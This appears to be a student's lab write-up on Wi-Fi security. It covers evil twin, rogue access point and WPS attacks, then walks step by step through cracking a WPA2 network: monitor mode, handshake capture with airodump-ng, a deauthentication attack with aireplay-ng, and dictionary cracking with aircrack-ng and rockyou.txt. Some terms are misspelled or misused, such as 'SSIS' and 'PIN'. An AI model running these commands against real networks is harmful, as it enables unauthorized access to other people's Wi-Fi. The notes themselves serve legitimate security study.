---
title: If you'd like to WPA, press the star key!
draft: false
tags:
  - cybersecurity
  - wireless
---

WiFi signals are broadcasted with a unique **SSIS**
We can connect if we know the pre-shared key **PSK**

### Wi-Fi's Pivotal Role in Organizations
A malicious actor from the outside could still see the broadcasted Wi-Fi SSID

### Attacks on Wi-Fi
- **Evil twin attack** : the attacker creates a fake access point that has similar name to the trusted one. The attack starts with the attacker sending de-authentication packets to all the users connected to their Wi-Fi
- **Rogue access point**: The attacker sets up an open Wi-Fi access point near or inside the organization's physical premises. Accidental join
- **WPS Attack**: 8-digit pin vulnerable. The attack is made by initiating a WPS handshake and capturing the router's response. The response contains information of the PIN for brute-force attack.
- **WPA/WPA2 cracking**: Attackers start by sending de-authentication packets to a legitimate user. When he disconnects they try to reconnect, and a 4way handshake with the router takes place. The attacker turns its adaptor into monitor mode and captures the handshake. Then bruteforce

### WPA/WPA2 Cracking

#### The 4-way Handshake
It's a process that helps a client device and a Wi-Fi router confirm they both have the right password or PSK:
- **Router sends a challenge**
- **Client responds with encrypted information**
- **Router verifies and sends confirmation**
- **Final check and connection established**


### The practical
`iw dev` shows any wireless devices and their configuration
```
phy#2 
	Interface wlan2 
		ifindex 5  
		wdev 0x200000001 
		addr 02:00:00:00:02:00 
		type managed 
		txpower 20.00 dBm
```

The `type` is managed, it/s a standard mode.

#### Scan nearby Wi-Fi
`sudo iw dev wlan2 scan`
Important information:
- **BSSID**
- Presence of **RSN (Robust Security Network)** indicates the network is using WPA2
- **Group and Pairwise ciphers** are **CCMP** Counter Mode with Cypher Block Chaining Message Authentication Code Protocol is the encryption methos used by WPA2
- **Authentication suites** value inside RSN is **PSK**
- `DS Parameter set` is channel 6. The channel refers to a specific frequency range within the broader Wi/Fi spectrum
- 2.4 ghz channels 1,6,11


#### Monitor Mode
Primarily used for network analysis and security auditing.
The interface listens to all wireless traffic on a specific channel
`sudo ip link set dev wlan2 down` to turn off the device
`sudo iw dev wlan2 set type monitor`
`sudo ip link set dev wlan2 up`


### The attack
In a first terminal we start capturing Wi-Fi traffic with `sudo airodump-ng wlan2`
Knowing the BSSID we run
`sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2`
Targeting the specific network

In the second terminal we will launch the deauthentication attack
`sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2`
The second BSSID is the target

The we see the handshake and try to crack the PIN
`sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap`

We found the key `fluffy/champ24`
We can connect
```bash
wpa_passphrase MalwareM_AP 'fluffy/champ24' > config
sudo wpa_suppicant -B -c config -i wlan2
```

